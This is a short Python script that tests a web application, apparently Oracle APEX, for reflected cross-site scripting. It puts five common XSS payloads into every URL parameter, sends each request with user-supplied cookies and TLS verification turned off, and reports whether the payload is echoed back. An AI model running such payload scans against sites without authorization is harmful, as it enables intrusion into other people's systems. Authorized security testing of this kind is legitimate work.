import requests
from bs4 import BeautifulSoup

# List of common XSS payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    "'><script>alert(1)</script>",
    "\" onmouseover=\"alert(1)\"",
    "<svg/onload=alert('XSS')>",
]

def inject_payloads(url, params, cookies):
    session = requests.Session()  # Create a session object to manage cookies
    
    # Add cookies to the session
    session.cookies.update(cookies)

    for payload in xss_payloads:
        print(f"\nTesting payload: {payload}")
        
        # Inject the payload into all parameters
        for param in params:
            params[param] = payload
        
        # Send a GET request with the injected payload and cookies
        response = session.get(url, params=params, verify=False)
        
        # Analyze the response
        if is_vulnerable(response.text, payload):
            print(f"Potential XSS vulnerability detected with payload: {payload}")
        else:
            print(f"No XSS detected with payload: {payload}")

def is_vulnerable(response_content, payload):
    # Basic analysis to check if the payload appears in the HTML response
    soup = BeautifulSoup(response_content, "html.parser")
    return payload in str(soup)

if __name__ == "__main__":
    # Input URL of the Oracle APEX application to test
    url = input("Enter the URL to test (with query parameters): ")

    # Extract parameters from the URL
    from urllib.parse import urlparse, parse_qs
    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)

    # Flatten the query parameter dictionary
    params = {key: value[0] for key, value in params.items()}

    # Ask the user for cookies (key=value format)
    raw_cookies = input("Enter cookies (format: key1=value1; key2=value2): ")
    
    # Convert raw cookies into a dictionary
    cookies = {}
    for cookie in raw_cookies.split(";"):
        key, value = cookie.strip().split("=")
        cookies[key] = value

    # Test the URL with XSS payloads and the provided cookies
    inject_payloads(url, params, cookies)
